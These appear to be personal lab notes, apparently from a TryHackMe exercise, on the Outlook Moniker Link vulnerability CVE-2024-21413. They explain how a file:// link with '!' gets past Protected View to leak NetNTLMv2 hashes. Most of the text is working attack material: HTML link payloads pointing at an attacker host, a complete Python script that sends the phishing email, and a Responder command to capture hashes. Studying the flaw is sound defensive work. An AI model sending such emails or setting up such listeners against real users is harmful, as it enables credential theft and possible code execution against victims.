AKA CVE-2024-21413

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413

Using this Outlook vulnerability, an attacker can send a hyperlink (Moniker Link). If the user clicks it, Outlook sends the user's NTLM credentials to the attacker

RCE (Remote Code Execution) is also possible using Moniker Link

Moniker Link: not a classical URL pointing to a website, but a link in Microsoft Office, telling Office to use built-in "moniker provider" to handle the link

The link is then hidden under seemingly legitimate buttons / display text (using CTRL+K or HTML code)
*Example*: 
```html
<a href="file://ATTACKER_IP/test">Click me</a>
```
This would be picked up by Outlook's Protected View

Protected View can be bypassed by including a "!" and some text:
```html
<a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>
```

>*The share doesn't need to exist on the remote device!
>An authentication attempt will occur regardless, 
>leading to the victim's Windows netNTLMv2 hash being sent to the attacker*

### Exploitation

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```
Script automating the email sending and including the moniker link, saved in a .py file for later execution

`responder -I ens5`: create SMB listener on attacker machine